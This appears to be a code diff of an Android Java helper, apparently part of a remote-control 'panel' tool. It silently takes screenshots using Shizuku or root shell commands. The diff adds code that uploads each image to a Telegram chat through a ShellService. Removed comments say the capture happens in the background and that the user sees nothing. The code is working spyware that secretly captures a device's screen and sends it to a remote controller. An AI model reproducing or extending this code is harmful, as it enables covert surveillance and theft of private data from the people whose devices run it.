@@ -1,18 +1,13 @@
 package com.java.panel;
 
-import android.os.Bundle;
+import android.content.Context;
 import android.os.Environment;
-import androidx.appcompat.app.AppCompatActivity;
 import java.io.File;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
 import java.lang.reflect.Method;
 
-public class ScreenCaptureActivity extends AppCompatActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        
+public class ScreenCaptureHelper {
+
+    public static void takeScreenshot(Context context, String chatId) {
         new Thread(() -> {
             try {
                 File dir = new File(Environment.getExternalStorageDirectory(), "/panel");
@@ -21,10 +16,9 @@ public class ScreenCaptureActivity extends AppCompatActivity {
                 File imageFile = new File(dir, "screenshot_" + System.currentTimeMillis() + ".png");
                 String path = imageFile.getAbsolutePath();
 
-                // Shizuku veya Root yetkisi ile ekran görüntüsü al (Arayüz açılmaz, direkt arka planda çeker)
                 boolean success = false;
                 
-                // Önce Shizuku ile dene
+                // Try with Shizuku first
                 try {
                     Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
                     Method newProcessMethod = shizukuClass.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
@@ -36,7 +30,7 @@ public class ScreenCaptureActivity extends AppCompatActivity {
                     }
                 } catch (Exception ignored) {}
 
-                // Shizuku olmazsa standart Root / shell ile dene
+                // If Shizuku fails, try with Root / shell
                 if (!success) {
                     Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "screencap -p " + path});
                     process.waitFor();
@@ -44,18 +38,16 @@ public class ScreenCaptureActivity extends AppCompatActivity {
                 }
 
                 if (success && ShellService.instance != null) {
-                    ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "📸 Ekran görüntüsü başarıyla alındı!");
-                    // İstersen direkt Telegram'a dosyayı gönderelim:
-                    // ShellService.instance.sendFileToTelegram(path, ShellService.instance.ADMIN_CHAT_ID);
+                    ShellService.instance.sendTelegramMessage(chatId, "📸 Screenshot taken, sending to Telegram...");
+                    ShellService.instance.sendFileToTelegram(path, chatId);
                 } else if (ShellService.instance != null) {
-                    ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Ekran görüntüsü alınamadı (Shizuku veya Root izni gerekli).");
+                    ShellService.instance.sendTelegramMessage(chatId, "❌ Could not take screenshot (Shizuku or Root permission required).");
                 }
             } catch (Exception e) {
                 if (ShellService.instance != null) {
-                    ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Hata: " + e.getMessage());
+                    ShellService.instance.sendTelegramMessage(chatId, "❌ Error: " + e.getMessage());
                 }
             }
-            finish(); // İş bittiği gibi anında kapanır, kullanıcı hiçbir şey göremez
         }).start();
     }
 }
